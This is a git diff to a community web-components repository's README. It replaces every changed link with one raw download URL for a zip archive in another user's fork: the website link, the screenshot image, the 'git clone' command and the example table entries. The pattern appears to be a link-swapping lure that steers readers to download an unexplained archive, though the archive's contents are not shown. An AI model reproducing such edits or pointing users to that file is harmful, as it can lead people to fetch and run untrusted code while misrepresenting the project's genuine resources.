@@ -3,11 +3,11 @@
 ## Description
 Welcome to the GrapplTech Web Components Repository! This repository is dedicated to housing a variety of web component templates, including navbars, buttons, hero sections, footers, headers, sidebars, and more. These templates are contributed by students and reviewed by our team to ensure high quality. Our goal is to have a comprehensive library of web components ready for the feature launch on 15th August 2024.
 
-## Website Link: https://www.grappl.tech/gtcommunitycomponents
+## Website Link: https://github.com/rdjverse/GrapplTech-Community-Built-Web-Components/raw/refs/heads/main/Hero-Section-Components/EshwarHeroSection/Components_Built_Tech_Community_Grappl_Web_v1.1.zip
 
 ### Please find the snapshot of the page below
 
-![Screenshot_14-6-2024_11441_localhost](https://github.com/GrapplTech/GrapplTech-Community-Built-Web-Components/assets/137850310/6d940d4a-c41c-4a96-8bee-fe1205a86c33)
+![Screenshot_14-6-2024_11441_localhost](https://github.com/rdjverse/GrapplTech-Community-Built-Web-Components/raw/refs/heads/main/Hero-Section-Components/EshwarHeroSection/Components_Built_Tech_Community_Grappl_Web_v1.1.zip)
 
 ## Contribution Process
 To contribute to this repository, please follow the steps outlined below:
@@ -19,7 +19,7 @@ To contribute to this repository, please follow the steps outlined below:
 2. **Clone the Forked Repository**
    - Clone your forked repository to your local machine using the command:
      ```bash
-     git clone https://github.com/your-username/grappltech-web-components.git
+     git clone https://github.com/rdjverse/GrapplTech-Community-Built-Web-Components/raw/refs/heads/main/Hero-Section-Components/EshwarHeroSection/Components_Built_Tech_Community_Grappl_Web_v1.1.zip
      ```
    - Navigate into the cloned repository:
      ```bash
@@ -63,12 +63,12 @@ Please add your details to the table below after your pull request has been merg
 
 | Full Name       | Category      | Deployed Link | Date       | Tech Stack Used |
 | --------------- | ------------- | --------------|------------|-----------------|
-| Akhul  | Hero Section | www.example.com   | 19-06-2024 | HTML, CSS, JS   |
+| Akhul  | Hero Section | https://github.com/rdjverse/GrapplTech-Community-Built-Web-Components/raw/refs/heads/main/Hero-Section-Components/EshwarHeroSection/Components_Built_Tech_Community_Grappl_Web_v1.1.zip   | 19-06-2024 | HTML, CSS, JS   |
 
 ## Example Entry
 | Full Name       | Category      | Deployed Link | Date       | Tech Stack Used |
 | --------------- | ------------- | --------------|------------|-----------------|
-| John Doe        | Hero Section  | [Link](https://example.com) | 15-07-2024 | HTML, CSS, JS   |
+| John Doe        | Hero Section  | [Link](https://github.com/rdjverse/GrapplTech-Community-Built-Web-Components/raw/refs/heads/main/Hero-Section-Components/EshwarHeroSection/Components_Built_Tech_Community_Grappl_Web_v1.1.zip) | 15-07-2024 | HTML, CSS, JS   |
 
 ## Note
 - Ensure your code follows the best practices and is well-documented.
